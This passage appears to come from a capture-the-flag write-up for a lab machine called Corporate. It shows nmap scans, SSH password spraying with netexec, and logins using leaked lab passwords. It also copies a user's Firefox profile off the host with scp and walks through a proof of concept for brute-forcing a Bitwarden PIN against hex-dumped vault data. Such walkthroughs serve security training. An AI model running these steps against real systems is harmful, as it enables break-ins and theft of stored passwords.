SF:x2000:54:08\x20GMT\r\nPragma:\x20no-cache\r\nServer:\x20pve-api-daemon/
SF:3\.0\r\nExpires:\x20Wed,\x2010\x20Jul\x202024\x2000:54:08\x20GMT\r\n\r\
SF:n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 108.59 seconds

```

The service is a Debian 11 bullseye server based on the [OpenSSH](https://packages.debian.org/search?keywords=openssh-server) version. It’s running LDAP with the hostname `ldap.corporate.htb`. There’s also NFS (2049) and a Proxmox API (3128), as well as HTTP servers on 3004 and 8006. 3004 looks like Gitea (based on the cookie that gets set) and 8006 like Proxmox PVE (based on the `Server` header).

#### 10.9.0.4 nmap

I’ll do the same for 10.9.0.4:

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.9.0.4
Starting Nmap 7.80 ( https://nmap.org ) at 2024-07-09 20:58 EDT
Nmap scan report for 10.9.0.4
Host is up (0.088s latency).
Not shown: 65533 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
111/tcp open  rpcbind

Nmap done: 1 IP address (1 host up) scanned in 7.35 seconds
oxdf@hacky$ nmap -p 22,111 -sCV 10.9.0.4
Starting Nmap 7.80 ( https://nmap.org ) at 2024-07-09 20:59 EDT
Nmap scan report for 10.9.0.4
Host is up (0.086s latency).

PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.34 seconds

```

There’s SSH (showing an Ubuntu 22.04 jammy server based on [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version), and RPC.

#### SSH Creds Check

Before I remotely enumerate either host, I’ll check if any of the creds I already have work on either host for SSH:

```

oxdf@hacky$ netexec ssh 10.9.0.1 -u users -p passes --no-bruteforce --continue-on-success
SSH         10.9.0.1        22     10.9.0.1         [*] SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u2
SSH         10.9.0.1        22     10.9.0.1         [-] elwin.jones:CorporateStarter04041987 Authentication failed.
SSH         10.9.0.1        22     10.9.0.1         [-] laurie.casper:CorporateStarter18111959 Authentication failed.
SSH         10.9.0.1        22     10.9.0.1         [-] nya.little:CorporateStarter21061965 Authentication failed.
SSH         10.9.0.1        22     10.9.0.1         [-] brody.wiza:CorporateStarter14071992 Authentication failed.
oxdf@hacky$ netexec ssh 10.9.0.4 -u users -p passes --no-bruteforce --continue-on-success
SSH         10.9.0.4        22     10.9.0.4         [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4
SSH         10.9.0.4        22     10.9.0.4         [+] elwin.jones:CorporateStarter04041987  (non root) Linux - Shell access!
SSH         10.9.0.4        22     10.9.0.4         [+] laurie.casper:CorporateStarter18111959  (non root) Linux - Shell access!
SSH         10.9.0.4        22     10.9.0.4         [+] nya.little:CorporateStarter21061965  (non root) Linux - Shell access!
SSH         10.9.0.4        22     10.9.0.4         [+] brody.wiza:CorporateStarter14071992  (non root) Linux - Shell access!

```

None work on .1, but all can log into .4!

### SSH

I’ll connect as elwin.jones:

```

oxdf@hacky$ sshpass -p CorporateStarter04041987 ssh elwin.jones@10.9.0.4
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)
...[snip]...
elwin.jones@corporate-workstation-04:~$

```

And grab `user.txt`:

```

elwin.jones@corporate-workstation-04:~$ cat user.txt
6fb9851d************************

```

Each of the users has `user.txt` in their home directory:

```

oxdf@hacky$ sshpass -p CorporateStarter14071992 ssh brody.wiza@10.9.0.4
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)
...[snip]...
brody.wiza@corporate-workstation-04:~$ cat user.txt
6fb9851d************************

```

## Shell as root on corporate-workstation

### Enumeration

#### Docker

This workstation is not the main Corporate host, but it’s also not a container. In fact, it’s running Docker. For example, the IP addresses:

```

elwin.jones@corporate-workstation-04:/$ ifconfig
docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:fa:c9:33:b0  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens18: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.9.0.4  netmask 255.255.255.0  broadcast 10.9.0.255
        inet6 fe80::f875:4eff:febc:ac92  prefixlen 64  scopeid 0x20<link>
        ether fa:75:4e:bc:ac:92  txqueuelen 1000  (Ethernet)
        RX packets 220837  bytes 43448168 (43.4 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 209444  bytes 58568536 (58.5 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 1433016  bytes 101835764 (101.8 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1433016  bytes 101835764 (101.8 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```

If this were the host machine, I would expect to see the 10.10.11.246 IP. The `docker0` IP in the 72.17.0.1, which suggests *this* is the Docker host. This makes sense as I already identified the Proxmox (opensource VMware) server above. If I try to list Docker hosts, it fails:

```

elwin.jones@corporate-workstation-04:/$ docker ps
permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get "http://%2Fvar%2Frun%2Fdocker.sock/v1.24/containers/json": dial unix /var/run/docker.sock: connect: permission denied

```

This user doesn’t have access to the Docker socket. Interestingly, the `engineer` group has read and write access:

```

elwin.jones@corporate-workstation-04:/$ ls -l /var/run/docker.sock 
srw-rw---- 1 root engineer 0 Jul  7 17:59 /var/run/docker.sock

```

If I can get access to a user in the engineer group, I can likely get root on this host.

#### Remote User Configuration

Interestingly, elwin.jones isn’t in `/etc/passwd`:

```

elwin.jones@corporate-workstation-04:~$ grep elwin /etc/passwd
elwin.jones@corporate-workstation-04:~$ grep brody /etc/passwd

```

The only users with shells are root and sysadmin:

```

elwin.jones@corporate-workstation-04:~$ grep 'sh$' /etc/passwd
root:x:0:0:root:/root:/bin/bash
sysadmin:x:1000:1000:sysadmin:/home/sysadmin:/bin/bash

```

`/home` is unusual as well:

```

elwin.jones@corporate-workstation-04:/home$ ls
guests  sysadmin

```

None of these users can access `sysadmin`. In `guests`, there’s a directory for each user I’ve logged in as:

```

elwin.jones@corporate-workstation-04:/home/guests$ ls
brody.wiza  elwin.jones

```

If I log in as another, that directory is created:

```

laurie.casper@corporate-workstation-04:/home/guests$ ls
brody.wiza  elwin.jones  laurie.casper

```

While the standard configuration for access is using the local `passwd` and `shadow` file, it is also possible to set up auth via a central repository like active directory or some other form of LDAP.

I don’t have access to see all the processes running on the system, as `/proc` is mounted with `hidepid=invisible`:

```

elwin.jones@corporate-workstation-04:~$ mount | grep '^proc'
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime,hidepid=invisible)

```

So I can’t be sure it’s running, but `sssd` has a configuration directory in `/etc`:

```

elwin.jones@corporate-workstation-04:~$ ls -ld /etc/sssd/
drwx--x--x 3 root root 4096 Apr 12  2023 /etc/sssd/

```

`sssd` is a [service](https://sssd.io/) for enrolling Linux machines into active directory or LDAP domains.

The home directories are mounted using [Autofs](https://help.ubuntu.com/community/Autofs):

```

elwin.jones@corporate-workstation-04:~$ mount | grep home
/etc/auto.home on /home/guests type autofs (rw,relatime,fd=6,pgrp=737,timeout=300,minproto=5,maxproto=5,indirect,pipe_ino=21847)
corporate.htb:/home/guests/elwin.jones on /home/guests/elwin.jones type nfs4 (rw,relatime,vers=4.2,rsize=524288,wsize=524288,namlen=255,hard,proto=tcp,timeo=600,retrans=2,sec=sys,clientaddr=10.9.0.4,local_lock=none,addr=10.9.0.1)
corporate.htb:/home/guests/brody.wiza on /home/guests/brody.wiza type nfs4 (rw,relatime,vers=4.2,rsize=524288,wsize=524288,namlen=255,hard,proto=tcp,timeo=600,retrans=2,sec=sys,clientaddr=10.9.0.4,local_lock=none,addr=10.9.0.1)
corporate.htb:/home/guests/laurie.casper on /home/guests/laurie.casper type nfs4 (rw,relatime,vers=4.2,rsize=524288,wsize=524288,namlen=255,hard,proto=tcp,timeo=600,retrans=2,sec=sys,clientaddr=10.9.0.4,local_lock=none,addr=10.9.0.1)
corporate.htb:/home/guests/nya.little on /home/guests/nya.little type nfs4 (rw,relatime,vers=4.2,rsize=524288,wsize=524288,namlen=255,hard,proto=tcp,timeo=600,retrans=2,sec=sys,clientaddr=10.9.0.4,local_lock=none,addr=10.9.0.1)

```

Autofs is managing `/home/guests` and then it mounts each user into that directory using NFS.

I can try to talk to NFS, but there are firewall rules blocking it from a non-root user:

```

elwin.jones@corporate-workstation-04:/etc/iptables$ cat rules.v4 
# Generated by iptables-save v1.8.7 on Sat Apr 15 13:45:23 2023
*filter
:INPUT ACCEPT [0:0]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
-A OUTPUT -p tcp -m owner ! --uid-owner 0 -m tcp --dport 2049 -j REJECT --reject-with icmp-port-unreachable
COMMIT

```

#### Users

elwin.jones is in the it group:

```

elwin.jones@corporate-workstation-04:~$ id
uid=5021(elwin.jones) gid=5021(elwin.jones) groups=5021(elwin.jones),503(it)

```

The other three users are in the consultant group:

```

oxdf@hacky$ sshpass -p CorporateStarter18111959 ssh laurie.casper@10.9.0.4 id
uid=5041(laurie.casper) gid=5041(laurie.casper) groups=5041(laurie.casper),504(consultant)
oxdf@hacky$ sshpass -p CorporateStarter14071992 ssh brody.wiza@10.9.0.4 id
uid=5068(brody.wiza) gid=5068(brody.wiza) groups=5068(brody.wiza),504(consultant)
oxdf@hacky$ sshpass -p CorporateStarter21061965 ssh nya.little@10.9.0.4 id
uid=5055(nya.little) gid=5055(nya.little) groups=5055(nya.little),504(consultant)

```

elwin.jones also seems to have a full Desktop home directory:

```

elwin.jones@corporate-workstation-04:~$ ls -la
total 68
drwxr-x--- 14 elwin.jones elwin.jones 4096 Nov 27  2023 .
drwxr-xr-x  6 root        root           0 Jul 10 11:13 ..
lrwxrwxrwx  1 root        root           9 Nov 27  2023 .bash_history -> /dev/null
-rw-r--r--  1 elwin.jones elwin.jones  220 Apr 13  2023 .bash_logout
-rw-r--r--  1 elwin.jones elwin.jones 3526 Apr 13  2023 .bashrc
drwx------ 12 elwin.jones elwin.jones 4096 Apr 13  2023 .cache
drwx------ 11 elwin.jones elwin.jones 4096 Apr 13  2023 .config
drwxr-xr-x  2 elwin.jones elwin.jones 4096 Apr 13  2023 Desktop
drwxr-xr-x  2 elwin.jones elwin.jones 4096 Apr 13  2023 Documents
drwxr-xr-x  2 elwin.jones elwin.jones 4096 Apr 13  2023 Downloads
drwxr-xr-x  3 elwin.jones elwin.jones 4096 Apr 13  2023 .local
drwx------  4 elwin.jones elwin.jones 4096 Apr 13  2023 .mozilla
drwxr-xr-x  2 elwin.jones elwin.jones 4096 Apr 13  2023 Music
drwxr-xr-x  2 elwin.jones elwin.jones 4096 Apr 13  2023 Pictures
-rw-r--r--  1 elwin.jones elwin.jones  807 Apr 13  2023 .profile
drwxr-xr-x  2 elwin.jones elwin.jones 4096 Apr 13  2023 Public
drwxr-xr-x  2 elwin.jones elwin.jones 4096 Apr 13  2023 Templates
-rw-r--r-- 79 root        sysadmin      33 Apr 15  2023 user.txt
drwxr-xr-x  2 elwin.jones elwin.jones 4096 Apr 13  2023 Videos

```

The others are empty other than `user.txt`:

```

oxdf@hacky$ sshpass -p CorporateStarter18111959 ssh laurie.casper@10.9.0.4 'ls -a'
.
..
.bash_history
.bash_logout
.bashrc
.cache
.profile
user.txt
oxdf@hacky$ sshpass -p CorporateStarter14071992 ssh brody.wiza@10.9.0.4 'ls -a'
.
..
.bash_history
.bash_logout
.bashrc
.cache
.profile
user.txt
oxdf@hacky$ sshpass -p CorporateStarter21061965 ssh nya.little@10.9.0.4 'ls -a'
.
..
.bash_history
.bash_logout
.bashrc
.cache
.profile
user.txt

```

### Firefox

#### Initial Enumeration

elwin.jones has an active Firefox profile:

```

elwin.jones@corporate-workstation-04:~/.mozilla/firefox/tr2cgmb6.default-release$ ls
addons.json             cookies.sqlite              formhistory.sqlite  protections.sqlite                  storage
addonStartup.json.lz4   crashes                     handlers.json       saved-telemetry-pings               storage.sqlite
AlternateServices.txt   credentialstate.sqlite      key4.db             search.json.mozlz4                  times.json
bookmarkbackups         datareporting               lock                security_state                      webappsstore.sqlite
browser-extension-data  extension-preferences.json  minidumps           sessionCheckpoints.json             xulstore.json
cert9.db                extensions                  permissions.sqlite  sessionstore-backups
compatibility.ini       extensions.json             pkcs11.txt          sessionstore.jsonlz4
containers.json         extension-store             places.sqlite       shield-preference-experiments.json
content-prefs.sqlite    favicons.sqlite             prefs.js            SiteSecurityServiceState.txt

```

The `extensions.json` file is large, and `jq` isn’t on the box, so I’ll `cat` the file over SSH and use my local copy to list the extensions:

```

oxdf@hacky$ sshpass -p 'CorporateStarter04041987' ssh elwin.jones@10.9.0.4 'cat .mozilla/firefox/tr2cgmb6.default-release/extensions.json' | jq -r '.addons[].defaultLocale.name'
Form Autofill
Picture-In-Picture
Firefox Screenshots
WebCompat Reporter
Web Compatibility Interventions
Language: English (CA)
Language: English (GB)
System theme — auto
Add-ons Search Detection
Google
Wikipedia (en)
Bing
DuckDuckGo
eBay
Dark
Firefox Alpenglow
Light
Amazon.com.au
Bitwarden - Free Password Manager

```

[Bitwarden](https://bitwarden.com/) jumps out immediately as interesting as a password manager.

I’ll copy the full profile back to my host:

```

oxdf@hacky$ sshpass -p 'CorporateStarter04041987' scp -r elwin.jones@10.9.0.4:/home/guests/elwin.jones/.mozilla/firefox/ .
scp: /home/guests/elwin.jones/.mozilla/firefox/tr2cgmb6.default-release/lock: No such file or directory

```

The error on the `lock` file is not important.

#### History

The `places.sqlite` file holds the browser history, and it’s located in the profile folder:

```

oxdf@hacky$ ls tr2cgmb6.default-release/
addons.json             content-prefs.sqlite        extension-store     places.sqlite            sessionstore.jsonlz4
addonStartup.json.lz4   cookies.sqlite              favicons.sqlite     prefs.js                 shield-preference-experiments.json
AlternateServices.txt   crashes                     formhistory.sqlite  protections.sqlite       SiteSecurityServiceState.txt
bookmarkbackups         credentialstate.sqlite      handlers.json       saved-telemetry-pings    storage
browser-extension-data  datareporting               key4.db             search.json.mozlz4       storage.sqlite
cert9.db                extension-preferences.json  minidumps           security_state           times.json
compatibility.ini       extensions                  permissions.sqlite  sessionCheckpoints.json  webappsstore.sqlite
containers.json         extensions.json             pkcs11.txt          sessionstore-backups     xulstore.json
oxdf@hacky$ sqlite3 tr2cgmb6.default-release/places.sqlite 
SQLite version 3.37.2 2022-01-06 13:25:41
Enter ".help" for usage hints.
sqlite>

```

There are several tables that might be interesting:

```

sqlite> .tables
moz_anno_attributes                 moz_keywords                      
moz_annos                           moz_meta                          
moz_bookmarks                       moz_origins                       
moz_bookmarks_deleted               moz_places                        
moz_historyvisits                   moz_places_metadata               
moz_inputhistory                    moz_places_metadata_search_queries
moz_items_annos                     moz_previews_tombstones 

```

The bookmarks look like the default Firefox set, and many other tables are empty. `moz_places` has the browser history:

```

sqlite> select url, title from moz_places;
url|title
https://www.mozilla.org/privacy/firefox/|
https://www.mozilla.org/en-US/privacy/firefox/|Firefox Privacy Notice — Mozilla
https://support.mozilla.org/products/firefox|
https://support.mozilla.org/kb/customize-firefox-controls-buttons-and-toolbars?utm_source=firefox-browser&utm_medium=default-bookmarks&utm_campaign=customize|
https://www.mozilla.org/contribute/|
https://www.mozilla.org/about/|
http://www.ubuntu.com/|
http://wiki.ubuntu.com/|
https://answers.launchpad.net/ubuntu/+addquestion|
http://www.debian.org/|
https://www.mozilla.org/firefox/?utm_medium=firefox-desktop&utm_source=bookmarks-toolbar&utm_campaign=new-users&utm_content=-global|
https://www.google.com/search?channel=fs&client=ubuntu&q=bitwarden+firefox+extension|bitwarden firefox extension - Google Search
https://bitwarden.com/help/getting-started-browserext/|Password Manager Browser Extensions | Bitwarden Help Center
https://addons.mozilla.org/en-GB/firefox/addon/bitwarden-password-manager/|Bitwarden - Free Password Manager – Get this Extension for 🦊 Firefox (en-GB)
https://bitwarden.com/browser-start/|Browser Extension Getting Started | Bitwarden
https://www.google.com/search?channel=fs&client=ubuntu&q=is+4+digits+enough+for+a+bitwarden+pin%3F|is 4 digits enough for a bitwarden pin? - Google Search

```

At the end, there’s getting started on Bitwarden, and then a Google search for “is 4 digits enough for a bitwarden pin”.

### Bitwarden Pin Brute Force

#### Theory

In February 2023 a researcher named ambiso released [this blog post](https://ambiso.github.io/bitwarden-pin/) about how the Bitwarden pin feature can be brute forced. It includes [this POC exploit](https://github.com/ambiso/bitwarden-pin) written in Rust. At the time of Corporate’s release, this was all that was publicly out there about this. I’ll show a cleaner tool that was released a few months after in the [next section](#bitwarden-pin-brute-force-alternative).

This POC requires access to a `data.json` file on the local system, likely for the desktop version of Bitwarden:

```

    let json: Value = serde_json::from_slice(
        &std::fs::read(format!(
            "{}/Bitwarden/data.json",
            env::var("XDG_CONFIG_HOME").unwrap()
        ))
        .unwrap(),
    )
    .unwrap();

```

I need to find this similar data in the extension.

A `salt` is created from the user’s email address:

```

    let email = json[json["activeUserId"].as_str().unwrap()]["profile"]["email"]
        .as_str()
        .unwrap();
    let salt = SaltString::b64_encode(email.as_bytes()).unwrap();

```

After that, it gets the pin-protected data into `encrypted`:

```

    let encrypted = json[json["activeUserId"].as_str().unwrap()]["settings"]["pinProtected"]
        ["encrypted"]
        .as_str()
        .unwrap();

```

That data is split on `.`, and then the second item is split on `|` into three things, each of which are base64-decoded into the `iv`, `ciphertext`, and `mac`:

```

    let mut split = encrypted.split(".");
    split.next();
    let encrypted = split.next().unwrap();
    let b64dec = base64::engine::general_purpose::STANDARD;

    let mut split = encrypted.split("|");
    let iv = b64dec.decode(split.next().unwrap()).unwrap();
    let ciphertext = b64dec.decode(split.next().unwrap()).unwrap();
    let mac = b64dec.decode(split.next().unwrap()).unwrap();

```

It then loops over the pins 0-9999 trying each to decrpyt, returning the pin.

#### Find Bitwarden Data

There is a bitwarden folder in `storage`, but it doesn’t have anything useful:

```

oxdf@hacky$ ls tr2cgmb6.default-release/storage/default/
 https+++addons.mozilla.org   https+++www.google.com
 https+++bitwarden.com       'moz-extension+++c8dd0025-9c20-49fb-a398-307c74e6f8b7^userContextId=4294967295'

```

The `moz-extension...` file is actually [where Firefox stores extension data](https://stackoverflow.com/questions/50706030/where-to-find-location-of-firefox-extension-data-other-than-profilename-browser). In this folder is a SQLite db:

```

oxdf@hacky$ file tr2cgmb6.default-release/storage/default/moz-extension+++c8dd0025-9c20-49fb-a398-307c74e6f8b7\^userContextId\=4294967295/idb/3647222921wleabcEoxlt-eengsairo.sqlite
tr2cgmb6.default-release/storage/default/moz-extension+++c8dd0025-9c20-49fb-a398-307c74e6f8b7^userContextId=4294967295/idb/3647222921wleabcEoxlt-eengsairo.sqlite: SQLite 3.x database, user version 416, last written using SQLite version 3038003, writer version 2, read version 2, file counter 4, database pages 14, cookie 0xd, schema 4, largest root page 11, UTF-8, vacuum mode 1, version-valid-for 4

```

It’s format is not obvious:

```

oxdf@hacky$ sqlite3 tr2cgmb6.default-release/storage/default/moz-extension+++c8dd0025-9c20-49fb-a398-307c74e6f8b7\^userContextId\=4294967295/idb/3647222921wleabcEoxlt-eengsairo.sqlite 
SQLite version 3.37.2 2022-01-06 13:25:41
Enter ".help" for usage hints.
sqlite> .tables
database            index_data          object_store        unique_index_data 
file                object_data         object_store_index
sqlite> select * from object_data;
1|019c4862c.bbe6.5727.c2g8.126e4cf85:ec|||
1|0bddpvouBdujwjuz|||P
1|0bdujwfVtfsJe|||8
1|0bqqJe|||8
1|0bvuifoujdbufeBddpvout|||P
1|0hmpcbm|||

```

There’s actually a ton more there, but `sqlite3` translates the data to ASCII before printing it, which drops non-ASCII characters. Viewing the `data` column in hex shows this:

```

sqlite> select hex(data) from object_data;
90B401040300010104F1FF01063C0800FFFF040000800400FFFF6461746101140101011800070D1818636970686572730117051800090D1820656E63727970746564051A0901013800240D209035353334663661372D313830662D343065302D626630382D656331373537363531646466000937053800020D3800690D51BE4800000E0D40306F7267616E697A6174696F6E490D4C100000FFFF080D2014666F6C646572111A39000C65646974018F20010000000200FFFF0C0D30287669657750617373776F72054E112000130D202E700018557365546F74700147152815781861766F72697465011D2E6000247265766973696F6E4461091C001B0D5868323032332D30342D31335431343A34393A34362E3335373937395A0143000031B8087479700554019800031DD0086E616D051800601150F0612E515246397649435172446548392F70374F30774447673D3D7C674E4A5078354664496639777366727937472F4161413D3D7C4B62303467756A35676E465165645645552F57785953354444504847454975322B5A58673155554E7A41733D05000045480C6E6F7465492E010108FFFF0D0D8014636F6C6C656329961120080700FF458800133D700863726525BC9A1001083830382910000B0D681864656C65746564113F0D01590018726570726F6D7025EC213011B8106C6F67696E0D2E41C831B80C75736572214C3948F05E563261684475674331376844637331445854755349513D3D7C686A6274636835666D53726E517930453544623857513D3D7C553050596C73345963356E53344A6A2F34577736324E7755484A5654574F66734E2F5934525941714F484D3D080DC800704D7400740D1058322E4970683336716D436F6D616973774C623134576C4121A7F05850494B43705A556A55616878495A4459383541336C4733494A7675774E4B37696A4C504930624F7339776F3D7C65787734656A57676A2B4A344A4D765665564E525A4141456C2B41454261397633743246734162724B35303D210F00140D80119000523AB0020901794800746D0100B40D3858322E6C6F557574576F5550377742784475586C502F35452130F09F7353395655656B5534703975656876626B376A6768706E7134386E776858534430364135554C474C7348366C61772F514B6669584D6D597979383638316349575357523750474B752F5570554F49353461785264624F6A39696456485949386A473278415A2F376A6771633D7C764E5A335A39455845372F427830473741686333763636663739736C6F464370515769514A7639684E62343D0000000012000045D0406175746F66696C6C4F6E506167654C6F618506110119F80875726945D7618851D84160012A41505168106D617463680115050108FFFF032D2808757269051239F050466C43544261586278646D7062654F6B63367356562138F05837484B53582F383041735A336B686B41504775364B4C3946727253315374324367736778706241623567343D7C41394638566D7876344E6C4E4B72426B556C6C32346D73373867413977524B4D796333635676496748536F3D058104000065909E0800D128A958250305F07E28063E600031200873656E95202138BE48009108997009940101CE5000910814706F6C69636989DBCE480000192DE871481047656E657285EA18486973746F727901A10D010160010BA118B1402E680611D22E280031281470726F766964F1B209012E280001120158D140086B6579114F052800120DA8E5DE2C6F53796D6D65747269634B651DA1015011703E080879F85050314C7174305378315232435174524E6B4D663566C170F09A65436F4B4B33724C4F4644722B686B454D6E4D5874304A56634871505843756A72475669732B4779773146723145336753632F766D6D68372F47767871355874726D38773151677753312F495051474578656F78667A5067436154354537686933613962363961365641593D7C36356464756D69375773776754305946796A5A2B7041686A7662443038612B467631357634724F345067633D0000211E690000102D082E7801004B2D2C6E0001010101200108216811081E500831A0114C010101305E50010101012001082E5000000A0DA01870726976617465A6A001000616F009F4D706322E78644D5932374D6850326A526D75444F2F526A6478773D3D7C507554436A666A363065583566513834754D59356D363274492F3467384A64383545644F2F3159654652594E3668774B537365564A3378625139314E4C314E66586C4632334F3669744673696F6F63744532557530717A7174717A4B6B304774334C786A4E6558736730774937594873695045633856496A6E41695A34614B66744F4B4C612B4E436B63464E4A4D6E4572713676414448656449487954626975327871343570477530724E587A69353962506E4F7977756E776D5A5732305471594E58614966392B73576F334876666541524A4C66347035397A505A4432533431476D6F75753065634B56427249584D336534662B67635952684371563832456A75726E416872514F74324B695851743375394E6C2F7A44384B645375477A6C56786F63394F445937504941567A56506A6142544A44656F54712F7A5836367A7A3571303931524E49384B564D676A376B4C6630334B705139506A6E6C5A63324A65594F513479576F704C5A3338317431574F476765532F693349623430656B45355344496B3333476A50744D372B63543148463332596C625949396D77454857546E34794D50354D446B5653382B456A5A75375A4F7654636937762F374E307832436F4B30342F423676596E45675A444257687035743366667A4C4575375739384334702B714B46554634786D2B7137484546706639555654584C62626D59524D565732755768306E674147436733597065596E33566B7976354E6D487867302B683250597666316F396A65496154355155526E723257624A62647375735839326C33774A3166513935612F2B7A524F4261635A316D4E4C33517A6F762F626C514A6F6341513830326D4949456F516530586E68463344426E5937506E6F565A5431626778326B614456464C6C4D41436F644D76466134354E7A39314E4234444E656A7A71304D797534564D584C773073663057644E5A3445456B4254556E56445153662F35737A61726D5734486745616B58394941737A50554D59474A4B617151396266355069736170396A5A4F654E4632304263707A78594E5654455A655137574F446D534F346673746248443562734A725238735063553231656B654E466A49686C39433732434357446576474F464974774C4A7035356458312F2F705844646752495A782F442B7A61723558582B41763341674F45794642363555644E6E51655049375546643433612B6B6D4144346E3864584A6B616C3247626842657A386A393851344E303847646A474D39636162586745566E69676550726733376B3859726842434C6D536A4F7A343048685954366B796E316773344E4A55306F6644366534446C39516C2F72373949427163654D756C6E3263554C396B42596852535253387646366975625675566831616D434E4350316B49756E6E2B325A57364F50576C446A56637A656273657869576731746743656B56784C45707345526F2B6830647133397537474C394876306C346E37374964524D73396C42777134446A6A683676524F2B3465714C774C4C787235445833516239794D2F62656F6E6E4D56454F7672384370706F7259727555794D6D776C394F594342704C7768635069503257743475455548766B526E5A7659552B784B74513249483836696A34756B47514E7550694A457A7676375A32336176335A77723169774C565553773843545950646A4E77387975714D455A6B4D4C776E4955324A58553533477258626F464E4755776A6C4551476A376C31506F346847307535564672485141697A55304D61564378444939584A4842566973594475535453477354492B347337347263667858666D64656B6E316A5362586F4378306859332F55375A6779547636704964463155354F4556443475444C314B7178326138316E4B36514477762F636E78544352564B32616F467557716774353762536333424D2F4756777550736F4D746F647A335776714F656C4D504D596B766A5144306D4450314174362F56664D6652304E504E306576746241584F5264787A4F576866492F5444754F506A32534C583649386A6137646A5279307953693173633953547462534365536A4D4D44396F682F496374416A375478355838556635714A594271446A585968396F43595065596B4A4C64356B376B635A6F756C7674646E507059584E647A4666527477517764326173324353494B772B464753506A424B7A364D644B6D684B5A494E4E543076596A67675238355537364862335063777273654E48612B4F4268595034797167634B515A35413D7C374A67516469624278627A3430784E544A4A4857653456384C4E7239457A7A3671452F52617A346F4F676F3D00000000000000001300FFFF0F0000800400FFFF63727970746F4D61737465724B657900E1280EF00FF1500C7075626C3ABF080400012A780E1EC00A0470720EE70B12330FE5700006ED600E000E0E2E101E90109830386233373531622D616164352D343631362D623166372D30313564336265373439646200000022A00F0E3C0E01941E980A20456C77696E204A6F6E164B0A00001EF80A1C656D61696C0000001E280A00650128042E6A01283040636F72706F726174652E6874055D04000022980D486861735072656D69756D506572736F6E616C6C12AA090E880C0E68101E400A106B646649741A720A0EF10908C0270912A00C3128146B64664D656D36880A21481E5811346B6466506172616C6C656C69736D0182010100FF35400C6B6466541A8B1005583158206B657948617368002C2D50C037344537316F505A4939764E6E6F45534E6B754C6C6144546C6B317A412F6348356C35584E4F4C4F6334773D000000000D0D3825201456657269666912741211E01EA8093C757365734B6579436F6E6E6563746F72019E2100001C0D403C636F6E766572744163636F756E74546F3E2C000901262810206C61737453796E63180D402E901130353A34303A32372E3533335A1A0D2039881046726F6D4F2A8612095A01012E78021E580C1873657474696E6721934578000F0D5034656E7669726F6E6D656E7455726C051F052000040D2008626173455800310D1018687474703A2F2F1E5F0C0874657305571465727665722D5941246C6F63616C3A383030300191000021AC16100A04617016800E09013908186964656E7469744554411051B00869636F4548090126E811186E6F746966696312DA0C09B6010100FF7550106576656E7415191968187765625661756C12981101681E300B006B3AD40109014638122070696E50726F7465632A93140E380B51E03EA80C008865A4F0C2FFFF32002E004400580047006400530061004E00380074004C0071003500740053005900580031004A0030005A00440067003D003D007C003400750058004C006D0052004E0070002F0064004A0067004500340031004D0059005600780071002B006E00760064006100750069006E007500300059004B00320065004B006F004D007600410045006D0076004A00380041004A003900440062006500780065007700720067006800580077006C00420076003900700052007C005500630042007A006905A4F0497500430069004A007000700035004D004F0052004200670048007600520032006D00560067007800330069006C007000510068004E0074007A004E004A0041007A00660034004D003D0021600E680C1E080E007621952054696D656F757441630EC01301222680140C6C6F636B011231B02E3000011804FFFF0EE410265015007031A50050226F1325F05E100300114DA0286571756976616C656E74440E0113555C0859000032701100023A100091C034616D65726974726164652E636F6DC10441FC00FF95400474643E220016080E81680EC81100043A580011981462616E6B6F66053C046361095B0501113811D808626F66051F01A001501118086D626E05180E981701181ED80D1475736563666F1D510D90114001302E6812113814737072696E7419381188D1080920087063730D2311501140146E657874656C0D1D0D014110017001A001082E7800D1D814796F757475622D5D00003960115810676F6F676C191F157871A00067E10036770005782178017801A82E78001138086170702E570015F011781469636C6F756436590001D000054D003ED00051302077656C6C73666172672D8431481E18080477660954019801A000164DA819381861647669736F7231692DC000065A780031A01C6D796D657272696C310C3E7800006D0D191178D1300D3608656467396501E800070D7001F02E400151C0046163E511106F6E6C696E193A394851A80C6369746901F2117871F001186104011C01E42150211011D001200C63617264310731D09160012001404281002D3000080DC001C82EC0001598046E6545EE312831F80118047476119659701E980808636F6D051D11B011D018646F776E6C6F61553211B01170086E657705CB215001E81170147365617263680553050131E811200475702E5600090121A000090DE001682EE00031201C62616E616E61726516C80A196011F011D008676170051D31A07198186F6C646E617679051C010111F031A01C706970